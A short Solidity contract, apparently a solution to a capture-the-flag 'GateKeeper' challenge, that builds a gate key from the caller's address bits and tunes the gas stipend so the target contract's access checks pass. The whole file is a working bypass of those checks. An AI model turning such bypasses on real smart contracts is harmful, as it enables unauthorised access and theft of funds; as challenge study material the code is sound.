pragma solidity ^0.4.19;

contract GateKeeperI {
  function enter(bytes32 _passcode, bytes8 _gateKey) public returns (bool);
}

contract Entrant {
  GateKeeperI gatekeeper;

  function Entrant(address _gatekeeper)
    public
  {
    gatekeeper = GateKeeperI(_gatekeeper);
  }

  function enter(bytes32 _passphrase)
    public
  {
    //      7  6  5  4  3  2  1  0
    //  0x 00 00 00 00 00 00 00 00
    //                      |_____|
    //                        msg.sender
    //
    //                |_____|
    //                  zeroes
    //
    uint256 stipend;
    uint256 offset;

    uint256 key;
    uint256 upper;
    uint256 lower;

    stipend = 500000;
    stipend -= stipend % 8191;

    offset = 0x1e7b;
    stipend -= offset;

    upper = uint256(bytes4("fnoo")) << 32;
    lower = uint256(uint16(msg.sender));

    key = upper | lower;

    assert(uint32(key) == uint16(key));
    assert(uint32(key) != uint64(key));
    assert(uint32(key) == uint16(tx.origin));

    gatekeeper.enter.gas(stipend)(_passphrase, bytes8(key));
  }
}